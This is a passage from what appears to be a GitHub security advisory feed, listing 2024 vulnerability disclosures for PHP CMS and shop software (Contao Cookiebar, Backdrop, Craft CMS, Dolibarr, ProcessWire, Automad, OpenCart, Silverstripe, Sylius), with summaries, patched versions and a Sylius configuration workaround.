<ul>
<li><a href="https://github.com/oveleon/contao-cookiebar/security/advisories/GHSA-296q-rj83-g9rq">https://github.com/oveleon/contao-cookiebar/security/advisories/GHSA-296q-rj83-g9rq</a></li>
<li><a href="https://github.com/oveleon/contao-cookiebar/commit/1d57470be5878f66d5e1e23f624dd387564b9b8d">https://github.com/oveleon/contao-cookiebar/commit/1d57470be5878f66d5e1e23f624dd387564b9b8d</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</a></li>
<li><a href="https://github.com/oveleon/contao-cookiebar/blob/2.x/src/Controller/CookiebarController.php">https://github.com/oveleon/contao-cookiebar/blob/2.x/src/Controller/CookiebarController.php</a></li>
<li><a href="https://github.com/advisories/GHSA-296q-rj83-g9rq">https://github.com/advisories/GHSA-296q-rj83-g9rq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-296q-rj83-g9rq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-26T14:28:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[oveleon/contao-cookiebar] Reflected Cross Site-Scripting (XSS) in Oveleon Cookiebar]]></title>
        <id>https://github.com/advisories/GHSA-296q-rj83-g9rq</id>
        <link href="https://github.com/advisories/GHSA-296q-rj83-g9rq"/>
        <updated>2024-07-26T14:28:29.000Z</updated>
        <content type="html"><![CDATA[<h2 id="usd-2024-0009--reflected-xss-in-oveleon-cookiebar">usd-2024-0009 | Reflected XSS in Oveleon Cookiebar</h2>
<h3 id="details">Details</h3>
<p><strong>Advisory ID</strong>: usd-2024-0009 
<strong>Product</strong>: Cookiebar<br><strong>Affected Version</strong>: 2.X<br><strong>Vulnerability Type</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')<br><strong>Security Risk</strong>: HIGH, CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:L/VA:N/SC:L/SI:L/SA:N<br><strong>Vendor URL</strong>: <a href="https://www.usd.de/">https://www.usd.de/</a><br><strong>CVE Number</strong>: Not requested yet<br><strong>CVE Link</strong>: Not requested yet    </p>
<h3 id="affected-component">Affected Component</h3>
<p>The <code>block</code> function in <code>CookiebarController.php</code>.</p>
<h3 id="desciption">Desciption</h3>
<p>Oveleon's Cookiebar is an extension for the popular Contao CMS.
The <code>block/locale</code> endpoint does not properly sanitize the user-controlled <code>locale</code> input before including it in the backend's HTTP response, thereby causing reflected XSS.</p>
<h3 id="fix">Fix</h3>
<p>Sanitize the <code>locale</code> input to prevent XSS payloads from being executed in a user's browser.</p>
<h3 id="timeline">Timeline</h3>
<ul>
<li><p><strong>2024-04-24</strong>: Vulnerability discovered by Daniel Ruppel of usd AG.</p>
</li>
<li><p><strong>2024-07-25</strong>: Probable cause of the vulnerability has been identified as Oveleon's Cookiebar Extension for Contao CMS.</p>
</li>
<li><p><strong>2024-07-25</strong>: Vulnerability disclosed via GitHub Vulnerability Report.</p>
</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/oveleon/contao-cookiebar/security/advisories/GHSA-296q-rj83-g9rq">https://github.com/oveleon/contao-cookiebar/security/advisories/GHSA-296q-rj83-g9rq</a></li>
<li><a href="https://github.com/oveleon/contao-cookiebar/commit/1d57470be5878f66d5e1e23f624dd387564b9b8d">https://github.com/oveleon/contao-cookiebar/commit/1d57470be5878f66d5e1e23f624dd387564b9b8d</a></li>
<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</a></li>
<li><a href="https://github.com/oveleon/contao-cookiebar/blob/2.x/src/Controller/CookiebarController.php">https://github.com/oveleon/contao-cookiebar/blob/2.x/src/Controller/CookiebarController.php</a></li>
<li><a href="https://github.com/advisories/GHSA-296q-rj83-g9rq">https://github.com/advisories/GHSA-296q-rj83-g9rq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-296q-rj83-g9rq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-26T14:28:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[backdrop/backdrop] Backdrop CMS does not sufficiently sanitize field labels before they are displayed in certain places]]></title>
        <id>https://github.com/advisories/GHSA-3wmx-48g3-x66g</id>
        <link href="https://github.com/advisories/GHSA-3wmx-48g3-x66g"/>
        <updated>2024-07-25T18:08:26.000Z</updated>
        <content type="html"><![CDATA[<p>Backdrop CMS before 1.27.3 and 1.28.x before 1.28.2 does not sufficiently sanitize field labels before they are displayed in certain places. This vulnerability is mitigated by the fact that an attacker must have a role with the "administer fields" permission.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41709">https://nvd.nist.gov/vuln/detail/CVE-2024-41709</a></li>
<li><a href="https://backdropcms.org/security/backdrop-sa-core-2024-001">https://backdropcms.org/security/backdrop-sa-core-2024-001</a></li>
<li><a href="https://github.com/backdrop/backdrop/commit/c7ff0500705668e3f58263590812872e44059301">https://github.com/backdrop/backdrop/commit/c7ff0500705668e3f58263590812872e44059301</a></li>
<li><a href="https://github.com/backdrop/backdrop/commit/f1dfe710c186fb47c9d949f01f37e5ab42b44030">https://github.com/backdrop/backdrop/commit/f1dfe710c186fb47c9d949f01f37e5ab42b44030</a></li>
<li><a href="https://github.com/advisories/GHSA-3wmx-48g3-x66g">https://github.com/advisories/GHSA-3wmx-48g3-x66g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3wmx-48g3-x66g</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-22T06:31:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[backdrop/backdrop] Backdrop CMS does not sufficiently sanitize field labels before they are displayed in certain places]]></title>
        <id>https://github.com/advisories/GHSA-3wmx-48g3-x66g</id>
        <link href="https://github.com/advisories/GHSA-3wmx-48g3-x66g"/>
        <updated>2024-07-25T18:08:26.000Z</updated>
        <content type="html"><![CDATA[<p>Backdrop CMS before 1.27.3 and 1.28.x before 1.28.2 does not sufficiently sanitize field labels before they are displayed in certain places. This vulnerability is mitigated by the fact that an attacker must have a role with the "administer fields" permission.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41709">https://nvd.nist.gov/vuln/detail/CVE-2024-41709</a></li>
<li><a href="https://backdropcms.org/security/backdrop-sa-core-2024-001">https://backdropcms.org/security/backdrop-sa-core-2024-001</a></li>
<li><a href="https://github.com/backdrop/backdrop/commit/c7ff0500705668e3f58263590812872e44059301">https://github.com/backdrop/backdrop/commit/c7ff0500705668e3f58263590812872e44059301</a></li>
<li><a href="https://github.com/backdrop/backdrop/commit/f1dfe710c186fb47c9d949f01f37e5ab42b44030">https://github.com/backdrop/backdrop/commit/f1dfe710c186fb47c9d949f01f37e5ab42b44030</a></li>
<li><a href="https://github.com/advisories/GHSA-3wmx-48g3-x66g">https://github.com/advisories/GHSA-3wmx-48g3-x66g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3wmx-48g3-x66g</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-22T06:31:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[craftcms/cms] Craft CMS Allows TOTP Token To Stay Valid After Use]]></title>
        <id>https://github.com/advisories/GHSA-wmx7-pw49-88jx</id>
        <link href="https://github.com/advisories/GHSA-wmx7-pw49-88jx"/>
        <updated>2024-07-26T21:40:28.000Z</updated>
        <content type="html"><![CDATA[<p>Craft CMS 5 allows reuse of TOTP tokens multiple times within the validity period.</p>
<h3 id="impact">Impact</h3>
<p>An attacker is able to re-submit a valid TOTP token to establish an authenticated session. This requires that the attacker has knowledge of the victim's credentials.</p>
<p>A TOTP token can be used multiple times to establish an authenticated session.
<a href="https://www.rfc-editor.org/rfc/rfc6238">RFC 6238</a> insists that an OTP must not be used more than once.</p>
<blockquote>
<p>The verifier MUST NOT accept the second attempt of the OTP after the successful validation has been issued for the first OTP, which ensures one-time only use of an OTP.</p>
</blockquote>
<p>The OWASP Application Security Verification Standard v4.0.3 (ASVS) <a href="https://github.com/OWASP/ASVS/blob/v4.0.3/4.0/en/0x11-V2-Authentication.md#v28-one-time-verifier">reiterates
this property with requirement 2.8.4</a>.</p>
<blockquote>
<p>Verify that time-based OTP can be used only once within the validity period.</p>
</blockquote>
<p>It should also be noted that the validity period of an TOTP token is 2 minutes. This makes a successful brute force attack more likely, since the four tokens are valid at the same time.</p>
<h3 id="patches">Patches</h3>
<p>This has been patched in Craft 5.2.3.</p>
<p>References:</p>
<p><a href="https://github.com/sbaresearch/advisories/tree/public/2024/SBA-ADV">https://github.com/sbaresearch/advisories/tree/public/2024/SBA-ADV</a> 2024061701_CraftCMS_TOTP_Valid_After_Use</p>
<p><a href="https://github.com/craftcms/cms/releases/tag/5.2.3">https://github.com/craftcms/cms/releases/tag/5.2.3</a></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/craftcms/cms/security/advisories/GHSA-wmx7-pw49-88jx">https://github.com/craftcms/cms/security/advisories/GHSA-wmx7-pw49-88jx</a></li>
<li><a href="https://github.com/craftcms/cms/commit/7c790fa5ad5a8cb8016cb6793ec3554c4c079e38">https://github.com/craftcms/cms/commit/7c790fa5ad5a8cb8016cb6793ec3554c4c079e38</a></li>
<li><a href="https://github.com/sbaresearch/advisories/tree/public/2024/SBA-ADV-20240617-01_CraftCMS_TOTP_Valid_After_Use">https://github.com/sbaresearch/advisories/tree/public/2024/SBA-ADV-20240617-01_CraftCMS_TOTP_Valid_After_Use</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41800">https://nvd.nist.gov/vuln/detail/CVE-2024-41800</a></li>
<li><a href="https://github.com/craftcms/cms/releases/tag/5.2.3">https://github.com/craftcms/cms/releases/tag/5.2.3</a></li>
<li><a href="https://github.com/advisories/GHSA-wmx7-pw49-88jx">https://github.com/advisories/GHSA-wmx7-pw49-88jx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wmx7-pw49-88jx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-25T17:58:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[dolibarr/dolibarr] Dolibarr ERP CRM vulnerable to remote code execution (RCE) ]]></title>
        <id>https://github.com/advisories/GHSA-vprp-94p9-5jp8</id>
        <link href="https://github.com/advisories/GHSA-vprp-94p9-5jp8"/>
        <updated>2024-07-25T16:44:51.000Z</updated>
        <content type="html"><![CDATA[<p>Dolibarr ERP CRM before 19.0.2 was discovered to contain a remote code execution (RCE) vulnerability via the Computed field parameter under the Users Module Setup function.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-40137">https://nvd.nist.gov/vuln/detail/CVE-2024-40137</a></li>
<li><a href="https://github.com/c0d3x27/CVEs/tree/main/CVE-2024-40137">https://github.com/c0d3x27/CVEs/tree/main/CVE-2024-40137</a></li>
<li><a href="https://github.com/advisories/GHSA-vprp-94p9-5jp8">https://github.com/advisories/GHSA-vprp-94p9-5jp8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vprp-94p9-5jp8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-24T21:31:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[processwire/processwire] ProcessWire Cross Site Request Forgery vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-r9vw-cjf9-xh4x</id>
        <link href="https://github.com/advisories/GHSA-r9vw-cjf9-xh4x"/>
        <updated>2024-07-19T22:39:58.000Z</updated>
        <content type="html"><![CDATA[<p>Cross Site Request Forgery vulnerability in ProcessWire v.3.0.229 allows a remote attacker to execute arbitrary code via a crafted HTML file to the comments functionality.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41597">https://nvd.nist.gov/vuln/detail/CVE-2024-41597</a></li>
<li><a href="https://gist.github.com/DefensiumDevelopers/608be4d10b016dce0566925368a8b08c#file-cve-2024-41597-md">https://gist.github.com/DefensiumDevelopers/608be4d10b016dce0566925368a8b08c#file-cve-2024-41597-md</a></li>
<li><a href="https://github.com/advisories/GHSA-r9vw-cjf9-xh4x">https://github.com/advisories/GHSA-r9vw-cjf9-xh4x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r9vw-cjf9-xh4x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-19T21:31:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[automad/automad] Automad arbitrary file upload vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-47mc-qmh2-mqj4</id>
        <link href="https://github.com/advisories/GHSA-47mc-qmh2-mqj4"/>
        <updated>2024-07-19T22:39:52.000Z</updated>
        <content type="html"><![CDATA[<p>An arbitrary file upload vulnerability in the image upload function of Automad v2.0.0 allows attackers to execute arbitrary code via a crafted file.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-40400">https://nvd.nist.gov/vuln/detail/CVE-2024-40400</a></li>
<li><a href="https://github.com/marcantondahmen/automad/issues/106">https://github.com/marcantondahmen/automad/issues/106</a></li>
<li><a href="https://github.com/marcantondahmen/automad/commit/112f070ccf423931c9bb2b36f9a26c345e1ef56e">https://github.com/marcantondahmen/automad/commit/112f070ccf423931c9bb2b36f9a26c345e1ef56e</a></li>
<li><a href="https://github.com/advisories/GHSA-47mc-qmh2-mqj4">https://github.com/advisories/GHSA-47mc-qmh2-mqj4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-47mc-qmh2-mqj4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-19T21:31:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[craftcms/cms] Craft CMS SQL injection vulnerability via the GraphQL API endpoint]]></title>
        <id>https://github.com/advisories/GHSA-hq4f-mv3q-8wcv</id>
        <link href="https://github.com/advisories/GHSA-hq4f-mv3q-8wcv"/>
        <updated>2024-07-19T21:44:48.000Z</updated>
        <content type="html"><![CDATA[<p>Craft CMS up to v3.7.31 was discovered to contain a SQL injection vulnerability via the GraphQL API endpoint.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37843">https://nvd.nist.gov/vuln/detail/CVE-2024-37843</a></li>
<li><a href="https://blog.smithsecurity.biz/craft-cms-unauthenticated-sqli-via-graphql">https://blog.smithsecurity.biz/craft-cms-unauthenticated-sqli-via-graphql</a></li>
<li><a href="https://github.com/advisories/GHSA-hq4f-mv3q-8wcv">https://github.com/advisories/GHSA-hq4f-mv3q-8wcv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hq4f-mv3q-8wcv</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-06-25T21:31:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[opencart/opencart] openCart Server-Side Template Injection (SSTI) vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-xrh7-2gfq-4rcq</id>
        <link href="https://github.com/advisories/GHSA-xrh7-2gfq-4rcq"/>
        <updated>2024-07-17T23:36:51.000Z</updated>
        <content type="html"><![CDATA[<p>A Server-Side Template Injection (SSTI) vulnerability in the edit theme function of openCart project v4.0.2.3 allows attackers to execute arbitrary code via injecting a crafted payload.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-40420">https://nvd.nist.gov/vuln/detail/CVE-2024-40420</a></li>
<li><a href="https://github.com/A3h1nt/CVEs/blob/main/OpenCart/Readme.md">https://github.com/A3h1nt/CVEs/blob/main/OpenCart/Readme.md</a></li>
<li><a href="https://github.com/advisories/GHSA-xrh7-2gfq-4rcq">https://github.com/advisories/GHSA-xrh7-2gfq-4rcq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xrh7-2gfq-4rcq</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-17T21:31:38.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[silverstripe/framework] Silverstripe uses TinyMCE which allows svg files linked in object tags]]></title>
        <id>https://github.com/advisories/GHSA-52cw-pvq9-9m5v</id>
        <link href="https://github.com/advisories/GHSA-52cw-pvq9-9m5v"/>
        <updated>2024-07-22T16:54:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>TinyMCE v6 has a configuration value <code>convert_unsafe_embeds</code> set to <code>false</code> which allows svg files containing javascript to be used in <code>&lt;object&gt;</code> or <code>&lt;embed&gt;</code> tags, which can be used as a vector for XSS attacks.</p>
<p>Note that <code>&lt;embed&gt;</code> tags are not allowed by default.</p>
<p>After patching the default value of <code>convert_unsafe_embeds</code> will be set to <code>true</code>. This means that <code>&lt;object&gt;</code> tags will be converted to iframes instead the next time the page is saved, which may break any pages that rely upon previously saved <code>&lt;object&gt;</code> tags. Developers can override this configuration if desired to revert to the original behaviour.</p>
<p>We reviewed the potential impact of this vulnerability within the context of Silverstripe CMS. We concluded this is a medium impact vulnerability given how TinyMCE is used by Silverstripe CMS.</p>
<h3 id="references">References:</h3>
<ul>
<li><a href="https://www.silverstripe.org/download/security-releases/ss-2024-001">https://www.silverstripe.org/download/security-releases/ss-2024-001</a></li>
<li><a href="https://github.com/advisories/GHSA-5359-pvf2-pw78">https://github.com/advisories/GHSA-5359-pvf2-pw78</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/silverstripe/silverstripe-framework/security/advisories/GHSA-52cw-pvq9-9m5v">https://github.com/silverstripe/silverstripe-framework/security/advisories/GHSA-52cw-pvq9-9m5v</a></li>
<li><a href="https://github.com/advisories/GHSA-5359-pvf2-pw78">https://github.com/advisories/GHSA-5359-pvf2-pw78</a></li>
<li><a href="https://github.com/FriendsOfPHP/security-advisories/blob/master/silverstripe/framework/SS-2024-001.yaml">https://github.com/FriendsOfPHP/security-advisories/blob/master/silverstripe/framework/SS-2024-001.yaml</a></li>
<li><a href="https://www.silverstripe.org/download/security-releases/ss-2024-001">https://www.silverstripe.org/download/security-releases/ss-2024-001</a></li>
<li><a href="https://github.com/advisories/GHSA-52cw-pvq9-9m5v">https://github.com/advisories/GHSA-52cw-pvq9-9m5v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-52cw-pvq9-9m5v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-07-17T16:00:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sylius/sylius] Sylius has a security vulnerability via adjustments API endpoint]]></title>
        <id>https://github.com/advisories/GHSA-55rf-8q29-4g43</id>
        <link href="https://github.com/advisories/GHSA-55rf-8q29-4g43"/>
        <updated>2024-07-17T19:13:35.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A security vulnerability was discovered in the <code>/api/v2/shop/adjustments/{id}</code> endpoint, which retrieves order adjustments based on incremental integer IDs. The vulnerability allows an attacker to enumerate valid adjustment IDs and retrieve order tokens. Using these tokens, an attacker can access guest customer order details - sensitive guest customer information. </p>
<h3 id="patches">Patches</h3>
<p>The issue is fixed in versions: 1.12.19, 1.13.4 and above. The <code>/api/v2/shop/adjustments/{id}</code> will always return <code>404</code> status.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Using YAML configuration:</p>
<p>Create <code>config/api_platform/Adjustment.yaml</code> file:</p>
<pre><code class="language-yaml"># config/api_platform/Adjustment.yaml

'%sylius.model.adjustment.class%':
    itemOperations:
        shop_get:
            controller: ApiPlatform\Core\Action\NotFoundAction
            read: false
            output: false
</code></pre>
<p>Or using XML configuration:</p>
<p>Copy the original configuration from vendor:</p>
<pre><code class="language-bash">cp vendor/sylius/sylius/src/Sylius/Bundle/ApiBundle/Resources/config/api_resources/Adjustment.xml config/api_platform
</code></pre>
<p>And change the <code>shop_get</code> operation in copied <code>config/api_platform/Adjustment.xml</code> file:</p>
<pre><code class="language-xml">&lt;!-- config/api_platform/Adjustment.xml --&gt;

...
&lt;itemOperation name="shop_get"&gt;
    &lt;attribute name="method"&gt;GET&lt;/attribute&gt;
    &lt;attribute name="path"&gt;/shop/adjustments/{id}&lt;/attribute&gt;
    &lt;attribute name="controller"&gt;ApiPlatform\Core\Action\NotFoundAction&lt;/attribute&gt;
    &lt;attribute name="read"&gt;false&lt;/attribute&gt;
    &lt;attribute name="output"&gt;false&lt;/attribute&gt;
&lt;/itemOperation&gt;
...
</code></pre>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in <a href="https://github.com/Sylius/Sylius/issues">Sylius issues</a></li>
<li>Email us at <a href="mailto:security@sylius.com">security@sylius.com</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Sylius/Sylius/security/advisories/GHSA-55rf-8q29-4g43">https://github.com/Sylius/Sylius/security/advisories/GHSA-55rf-8q29-4g43</a></li>
<li><a href="https://github.com/Sylius/Sylius/commit/d833b2871caa3b8d1f0a8207378bb778f0b90464">https://github.com/Sylius/Sylius/commit/d833b2871caa3b8d1f0a8207378bb778f0b90464</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-40633">https://nvd.nist.gov/vuln/detail/CVE-2024-40633</a></li>
<li><a href="https://github.com/advisories/GHSA-55rf-8q29-4g43">https://github.com/advisories/GHSA-55rf-8q29-4g43</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-55rf-8q29-4g43</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-07-17T14:32:18.000Z</published>
    </entry>
</feed>